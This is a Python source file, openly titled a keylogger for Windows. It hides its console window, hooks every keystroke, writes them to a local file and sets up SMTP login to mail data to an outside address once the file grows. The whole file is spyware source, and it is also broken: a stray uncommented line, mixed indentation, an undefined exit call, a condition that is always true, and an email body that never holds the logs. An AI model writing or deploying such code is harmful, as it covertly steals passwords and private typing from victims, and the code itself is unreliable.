# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom, pyHook
from pathlib import Path
import smtplib, ssl

port = 587  # For SSL
smtp_server = "example.com"
sender_email = "example@ex.com"  # Enter your address
receiver_email = "example@outlook.com"  # Enter receiver address
password = "EXAMPLE"
message = "this is a test"

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)
  
def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
    #open output.txt to read current keystrokes
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
    # open output.txt to write current + new keystrokes
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
        	keylogs = '/n'
        	buffer += keylogs
        	f.write(buffer)
        	f.close()

            send txt in mail
        	if (Path('c:\output.txt').stat().st_size)>1000:
        		context = ssl.create_default_context()
				with smtplib.SMTP(smtp_server,port) as server:
        			server.ehlo()  # Can be omitted
        			server.starttls(context=context)
        			server.ehlo()  # Can be omitted
        			server.login(sender_email, password)
        			server.sendmail(sender_email, receiver_email, message)


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
